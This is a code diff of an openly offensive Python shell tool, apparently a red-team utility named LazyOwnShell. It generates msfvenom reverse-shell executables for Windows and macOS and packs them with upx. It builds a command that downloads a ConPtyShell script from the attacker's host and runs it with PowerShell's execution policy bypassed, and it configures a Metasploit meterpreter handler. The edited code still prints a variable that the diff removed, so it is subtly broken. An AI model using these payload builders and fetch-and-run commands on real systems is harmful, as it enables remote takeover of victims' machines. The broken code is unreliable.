@@ -674,15 +674,11 @@ class LazyOwnShell(Cmd):
         os.system(
             f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell.exe'
         )
-        os.system(
-            f'msfvenom -p windows/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell64.exe'
-        )        
+        
         os.system(
             f'msfvenom -p osx/x86/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell.macho'
         )
-        result = subprocess.getoutput(
-            f"msfvenom -p linux/x86/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f python -b '\x80\x0a\x0d'"
-        )
+        
         print(f"[*] LHOST={lhost} LPORT={lport}")
         print(result)
         os.system("mv shell.* sessions")
@@ -692,7 +688,7 @@ class LazyOwnShell(Cmd):
         os.system("upx sessions/shell.elf")
         os.system("upx sessions/shell.macho")
         os.system("upx sessions/shell.exe")
-        os.system("upx sessions/shell64.exe")
+        
         print("[?] To run web server exec command: www or lazywebshell [;,;] ")
         return
 
@@ -1374,7 +1370,7 @@ class LazyOwnShell(Cmd):
             return
 
         os.system("cd sessions && wget https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 && wget https://github.com/antonioCoco/ConPtyShell/releases/download/1.5/ConPtyShell.zip")
-        cmd = f"""IEX(IWR http://{lhost}/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {lhost} {lport}"""
+        cmd = f"""curl http://{lhost}/Invoke-ConPtyShell.ps1 -o Invoke-ConPtyShell.ps1 ; powershell.exe -NoProfile -ExecutionPolicy Bypass -File 'Invoke-ConPtyShell.ps1 {lhost} {lport}'"""
         os.system(f"echo '{cmd}' |  xclip -sel clip")
         print(f"{GREEN}[+]{cmd} {YELLOW} Copied to clipboard :D {RESET}")
         return
@@ -1500,7 +1496,7 @@ class LazyOwnShell(Cmd):
         return
     def do_clean(self, line):
         """delete all from sessions"""
-        os.system("rm sessions/*.ps1 sessions/*.exe sessions/*.nmap sessions/*.py sessions/req*  sessions/revshell* sessions/*.php sessions/hash.txt reports puertos sessions/test* -rf")
+        os.system("rm sessions/*.ps1 sessions/*.elf sessions/*.macho sessions/*.zip sessions/*.exe sessions/*.nmap sessions/*.py sessions/req*  sessions/revshell* sessions/*.php sessions/hash.txt reports puertos sessions/test* -rf")
         print(f"{GREEN}[*]{YELLOW} cleanned sessions directory. {RESET}")
         return
 
@@ -1573,7 +1569,7 @@ class LazyOwnShell(Cmd):
             with open(rc_file_path, 'w') as file:
                 file.write(f"""
                 use exploit/multi/handler
-                set payload windows/x64/shell_reverse_tcp
+                set payload windows/meterpreter/reverse_tcp
                 set LHOST {lhost}
                 set LPORT {lport}
                 run
